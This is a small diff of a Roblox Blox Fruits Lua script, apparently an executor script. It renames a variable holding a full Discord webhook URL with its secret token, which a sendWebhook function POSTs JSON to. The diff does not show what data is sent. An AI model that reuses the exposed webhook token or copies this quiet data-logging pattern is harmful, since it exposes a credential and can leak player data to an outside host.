@@ -1,5 +1,5 @@
 -- BLOX FRUIT?
-LogsWebhook = "https://discord.com/api/webhooks/1207564677261828136/3fPdzMvRUB-eKKI4wmGp7tr0Ay5FJeIJJ7nnNwzrUBb7cyxY4jpZV4hRrKATPBBZRz_R"
+Webhook1 = "https://discord.com/api/webhooks/1207564677261828136/3fPdzMvRUB-eKKI4wmGp7tr0Ay5FJeIJJ7nnNwzrUBb7cyxY4jpZV4hRrKATPBBZRz_R"
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local CoreGui = game:GetService("CoreGui")
@@ -100,7 +100,7 @@ local function sendWebhook()
     })
 
     request({
-        Url = LogsWebhook,
+        Url = Webhook1,
         Method = "POST",
         Headers = {
             ["Content-Type"] = "application/json"
